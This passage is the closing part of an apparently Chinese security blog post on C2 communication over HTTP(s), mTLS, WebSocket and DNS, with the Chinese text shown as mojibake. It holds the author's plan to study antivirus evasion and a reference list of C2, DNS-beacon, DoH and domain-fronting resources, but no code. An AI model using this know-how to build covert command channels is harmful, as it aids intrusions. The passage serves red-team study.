<h1 id="äº”ã€ä¸‹ä¸€æ­¥è®¡åˆ’"><a href="#äº”ã€ä¸‹ä¸€æ­¥è®¡åˆ’" class="headerlink" title="äº”ã€ä¸‹ä¸€æ­¥è®¡åˆ’"></a>äº”ã€ä¸‹ä¸€æ­¥è®¡åˆ’</h1><p>è¯´å®è¯C2ç¼–ç¨‹æœ‰ç‚¹ç©è…»äº†ï¼Œç¼–ç ä¹Ÿä¸æ˜¯æˆ‘çš„å¼ºé¡¹ï¼Œæˆ‘å†™çš„ä»£ç çœŸæ˜¯ä¸€å¨å±ï¼Œ<strong>æ‰€ä»¥æƒ³ç ”ç©¶ç‚¹äºŒè¿›åˆ¶ç›¸å…³çš„å†…å®¹ï¼Œç‰¹åˆ«æƒ³ç ”ç©¶å…æ€ç›¸å…³çš„ï¼Œé‚£é‡Œæ‰æ˜¯æˆ‘çš„èˆ’é€‚åŒºæ„Ÿè§‰åƒå›åˆ°å®¶ä¸€æ ·çš„äº²è¿‘æ„Ÿï¼Œé‚£é‡Œçš„â€œä¸€ç –ä¸€ç“¦â€éƒ½è®©äººå€æ„Ÿäº²åˆ‡å’Œå…´å¥‹</strong>ğŸ˜­ã€‚</p>
<p>è€Œä¸”<a target="_blank" rel="noopener" href="https://github.com/kyxiaxiang">å¯ä»¥éæƒ³ï¼ˆkyxiaxiangï¼‰</a>å¤§ä½¬å…¬å¼€äº†CS Beaconçš„æºç ï¼Œè¿™é‡Œé¢æœ‰å¤ªå¤šå€¼å¾—ç ”ç©¶ä¸œè¥¿ï¼Œä¹Ÿä¸çŸ¥é“å„ä½å¸ˆå‚…æƒ³çœ‹ä»€ä¹ˆå†…å®¹å‘ï¼Ÿæˆ‘çš„ç›®æ ‡æ°¸è¿œä¸æ˜¯é‡æ„Beaconï¼Œè€Œæ˜¯ç ”ç©¶å…¶ä»¤äººå¹ä¸ºè§‚æ­¢çš„æŠ€æœ¯ï¼Œå…¶å¯¹æŠ—çš„å“²å­¦æ€æƒ³ä»¤æˆ‘ç€è¿·ã€‚</p>
<p>è¿˜æœ‰å¯¹å¤§å®¶è¯´ä¸€å£°éå¸¸æŠ±æ­‰ï¼Œç”±äºæ—¶é—´ç´§è¿«ï¼ŒæŠ€æœ¯ã€ç»éªŒã€ä»¥åŠè®¤çŸ¥ç­‰å¤šæ–¹é¢çš„ä¸è¶³ï¼Œå¯¼è‡´è¿™ç¯‡æ–‡ç« å†™çš„ä¸æ˜¯å¾ˆæ»¡æ„ï¼Œæœ‰ä¸€äº›å†…å®¹æ²¡æœ‰åšå®éªŒéªŒè¯ï¼Œæ–‡ç« ä¸­çš„çœ‹æ³•åªæ˜¯ä¸ªäººè§è§£ï¼Œè§‚ç‚¹éå¸¸ç‹­éš˜ï¼Œæœ‰ä¸è¶³ä¹‹å¤„è¿˜è¯·å„ä½å¸ˆå‚…æŒ‡å‡ºï¼</p>
<p>å„ä½å¸ˆå‚…ï¼Œéƒ½çœ‹åˆ°è¿™é‡Œäº†ï¼Œæ±‚ä¸ª<strong>ç‚¹èµã€æ”¶è—åŠ å…³æ³¨</strong>ä¸è¿‡åˆ†å§ï¼Ÿ(â—â€¢á´—â€¢â—)ã€‚æˆ‘ä¿è¯ä¸‹ç¯‡æ–‡ç« åŒæ ·ç²¾å½©ï¼Œè™½ç„¶æˆ‘æ²¡å†™ï¼Œä¸å‡ºæ„å¤–12æœˆåº•å‰è‡³å°‘å‘ä¸€ç¯‡æ–‡ç« ï¼Œåˆ°æ—¶å€™æ¥ä¸ªå¹´åº¦æ€»ç»“ã€‚</p>
<h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ol>
<li><p><a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver/blob/master/server/c2/mtls.go">sliver&#x2F;server&#x2F;c2&#x2F;mtls.go at master Â· BishopFox&#x2F;sliver</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver/blob/master/implant/sliver/transports/mtls/mtls.go">sliver&#x2F;implant&#x2F;sliver&#x2F;transports&#x2F;mtls&#x2F;mtls.go at master Â· BishopFox&#x2F;sliver</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.runoob.com/html/html5-websocket.html">HTML5 WebSocket | èœé¸Ÿæ•™ç¨‹</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/veo/wsMemShell?tab=readme-ov-file">veo&#x2F;wsMemShell: WebSocket å†…å­˜é©¬&#x2F;Webshellï¼Œä¸€ç§æ–°å‹å†…å­˜é©¬&#x2F;WebShellæŠ€æœ¯</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://ipw.cn/dns/">åŸŸåè§£ææŸ¥è¯¢ | DNSæŸ¥è¯¢ | IPv6è§£æ | åœ¨çº¿dig | IPæŸ¥è¯¢(ipw.cn)</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.runoob.com/np/dns-protocol.html">DNS åè®® | èœé¸Ÿæ•™ç¨‹</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://c.biancheng.net/view/6457.html">DNSæŠ¥æ–‡æ ¼å¼è§£æï¼ˆéå¸¸è¯¦ç»†ï¼‰ - Cè¯­è¨€ä¸­æ–‡ç½‘</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver/blob/master/server/c2/dns.go">sliver&#x2F;server&#x2F;c2&#x2F;dns.go at master Â· BishopFox&#x2F;sliver</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/no0be/DNSlivery">no0be&#x2F;DNSliveryï¼šé€šè¿‡ DNS è½»æ¾äº¤ä»˜æ–‡ä»¶å’Œæœ‰æ•ˆè´Ÿè½½</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/2252">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-çº¢é˜Ÿå·¥å…·ç ”ç©¶ç¯‡ - Sliver C2 é€šä¿¡æµé‡åˆ†æ</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/292228.html">æµ…ææ¶æ„è½¯ä»¶é€šä¿¡æŠ€æœ¯ï¼šåŸºäºDoHçš„C2ä¿¡é“ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/DoHC2">SpiderLabs&#x2F;DoHC2ï¼šDoHC2 å…è®¸é€šè¿‡ DNS over HTTPS ï¼ˆDoHï¼‰ åˆ©ç”¨ Ryan Hanson ï¼ˆhttps://github.com/ryhanson/ExternalC2ï¼‰ çš„ ExternalC2 åº“è¿›è¡Œå‘½ä»¤å’Œæ§åˆ¶ ï¼ˆC2ï¼‰ã€‚</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://dominicbreuker.com/post/learning_sliver_c2_05_transports_in_detail_dns/#:~:text=Pass%20it%20as%20an%20argument%20to%20the%20dns,ID%20Name%20Protocol%20Port%201%20dns%20udp%2053">å­¦ä¹  Sliver C2 ï¼ˆ05ï¼‰ - ä¼ è¾“è¯¦ç»†ä¿¡æ¯ï¼šDNS |æ–‡&#x2F;ç´ </a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7533">è¸©å‘è®°å½•-DNS Beacon-å…ˆçŸ¥ç¤¾åŒº</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/henry666/p/16905617.html">å†…ç½‘æ¸—é€ç¥å™¨CobaltStrikeä¹‹DNS Beacon(å››) - äº¨åˆ©å…¶å®å¾ˆå - åšå®¢å›­</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.z3ratu1.top/CS%20DNS%20beacon%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E6%8C%87%E5%8C%97.html">CS DNS beaconäºŒæ¬¡å¼€å‘æŒ‡åŒ— | Z3ratu1â€™s blog</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/334022.html">Cobalt Strike: è§£å¯†DNSæµé‡ â€“ Part 5 - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12070">C2éšåŒ¿-äº‘å‡½æ•°&amp;åŸŸå‰ç½®-å…ˆçŸ¥ç¤¾åŒº</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://rivers.chaitin.cn/blog/cqm7qf90lnec5jjug7b0">æµé‡å¯¹æŠ—-åŸŸå‰ç½®åŸºç¡€è®¾æ–½æ­å»º | é•¿äº­ç™¾å·äº‘</a></p>
</li>
</ol>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2025/10/12/Go%E5%A4%9A%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>Prev</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
              2025-10-14 21:59:51
            </span>
            
                  <span class="post-categories">
                    <i class="iconfont icon-bookmark" title="Categories"></i>
                    
                    <span class="span--category">
                      <a href="/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-C2/" title="å®‰å…¨å¼€å‘_C2">
                        <b>#</b> å®‰å…¨å¼€å‘_C2
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">Contents</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81HTTP-HTTPS"><span class="toc-text">ä¸€ã€HTTP&#x2F;HTTPS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E6%80%9D%E8%B7%AF%E6%9E%84%E5%BB%BA"><span class="toc-text">1.1 æ€è·¯æ„å»º</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-text">1.2 ä»£ç å®ç°</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-1-Server"><span class="toc-text">1.2.1 Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-2-Beacon"><span class="toc-text">1.2.2 Beacon</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-text">1.3 æµé‡åˆ†æ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-%E5%9F%9F%E5%89%8D%E7%BD%AE"><span class="toc-text">1.4 åŸŸå‰ç½®</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81mTLS"><span class="toc-text">äºŒã€mTLS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E6%80%9D%E8%B7%AF%E6%9E%84%E5%BB%BA"><span class="toc-text">2.1 æ€è·¯æ„å»º</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-text">2.2 ä»£ç å®ç°</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1-%E7%94%9F%E6%88%90%E8%AF%81%E4%B9%A6"><span class="toc-text">2.2.1 ç”Ÿæˆè¯ä¹¦</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2-Server"><span class="toc-text">2.2.2 Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-3-Beacon"><span class="toc-text">2.2.3 Beacon</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-text">2.3 æµé‡åˆ†æ</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81WebSocket"><span class="toc-text">ä¸‰ã€WebSocket</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E6%80%9D%E8%B7%AF%E6%9E%84%E5%BB%BA"><span class="toc-text">3.1 æ€è·¯æ„å»º</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-text">3.2 ä»£ç å®ç°</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-1-server"><span class="toc-text">3.2.1 server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-2-beacon"><span class="toc-text">3.2.2 beacon</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-text">3.3 æµé‡åˆ†æ</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81DNS"><span class="toc-text">å››ã€DNS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">4.1 å‰ç½®çŸ¥è¯†</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89DNS%E5%8D%8F%E8%AE%AE"><span class="toc-text">ï¼ˆä¸€ï¼‰DNSåè®®</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84"><span class="toc-text">ï¼ˆäºŒï¼‰æŠ¥æ–‡ç»“æ„</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-Cobalt-Strike-DNS-Beacon%E4%BD%BF%E7%94%A8"><span class="toc-text">4.2 Cobalt Strike DNS Beaconä½¿ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E6%B3%A8%E5%86%8C%E5%9F%9F%E5%90%8D%E5%92%8C%E6%B7%BB%E5%8A%A0%E8%AE%B0%E5%BD%95"><span class="toc-text">ï¼ˆä¸€ï¼‰æ³¨å†ŒåŸŸåå’Œæ·»åŠ è®°å½•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E5%88%9B%E5%BB%BADNS%E7%9B%91%E5%90%AC%E5%99%A8%E5%B9%B6%E5%AE%8C%E6%88%90%E4%B8%8A%E7%BA%BF"><span class="toc-text">ï¼ˆäºŒï¼‰åˆ›å»ºDNSç›‘å¬å™¨å¹¶å®Œæˆä¸Šçº¿</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-text">ï¼ˆä¸‰ï¼‰æµé‡åˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9"><span class="toc-text">ï¼ˆå››ï¼‰éœ€è¦æ³¨æ„çš„ç‚¹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-%E6%80%9D%E8%B7%AF%E6%9E%84%E5%BB%BA"><span class="toc-text">4.3 æ€è·¯æ„å»º</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-text">4.4 ä»£ç å®ç°</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%8F%91%E9%80%81%E5%BF%83%E8%B7%B3%E5%8C%85-Beacon"><span class="toc-text">ï¼ˆä¸€ï¼‰å‘é€å¿ƒè·³åŒ…-Beacon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E8%A7%A3%E6%9E%90%E5%9B%9E%E4%BC%A0%E6%95%B0%E6%8D%AE-server"><span class="toc-text">ï¼ˆäºŒï¼‰è§£æå›ä¼ æ•°æ®-server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E8%8E%B7%E5%8F%96%E4%BB%BB%E5%8A%A1%E3%80%81%E6%89%A7%E8%A1%8C%E4%BB%BB%E5%8A%A1%E3%80%81%E5%9B%9E%E4%BC%A0%E7%BB%93%E6%9E%9C-Beacon"><span class="toc-text">ï¼ˆä¸‰ï¼‰è·å–ä»»åŠ¡ã€æ‰§è¡Œä»»åŠ¡ã€å›ä¼ ç»“æœ-Beacon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E5%AE%9E%E9%AA%8C"><span class="toc-text">ï¼ˆå››ï¼‰å®éªŒ</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E4%B8%8B%E4%B8%80%E6%AD%A5%E8%AE%A1%E5%88%92"><span class="toc-text">äº”ã€ä¸‹ä¸€æ­¥è®¡åˆ’</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">å‚è€ƒèµ„æ–™</span></a></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        




  
    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
  

  <div id="vcomments"></div>

  <script>
    function loadValineSuc() {
      new Valine({
        el: '#vcomments',
        appId: 'kr7nhXQQsnagsiZAr9IIxoDq-gzGzoHsz',
        appKey: 'Sujqic7fHSzakqEntTDwEJp3',
        placeholder: 'Welcome!',
        avatar: 'retro',
        lang: 'en'
      })
    }
  </script>

    <style>
      .comments-container .v .vempty {
        display: none!important;
      }
    </style>




      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" target="_blank" rel="noopener" href="https://github.com/onedays12">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/onedays12">Copyright Â© 2025 oneday</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="Search...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer toï¼š<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + C2%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AHTTP(s)%E3%80%81mTLS%E3%80%81WebSocket%E3%80%81DNS + '&url=' + http%3A%2F%2Fexample.com%2F2025%2F10%2F14%2FC2%25E9%2580%259A%25E4%25BF%25A1%25E5%258D%258F%25E8%25AE%25AE%25E8%25A7%25A3%25E6%259E%2590%25EF%25BC%2588%25E4%25B8%2580%25EF%25BC%2589%25EF%25BC%259AHTTP-s-%25E3%2580%2581mTLS%25E3%2580%2581WebSocket%25E3%2580%2581DNS%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2025/10/14/C2%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AHTTP-s-%E3%80%81mTLS%E3%80%81WebSocket%E3%80%81DNS/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
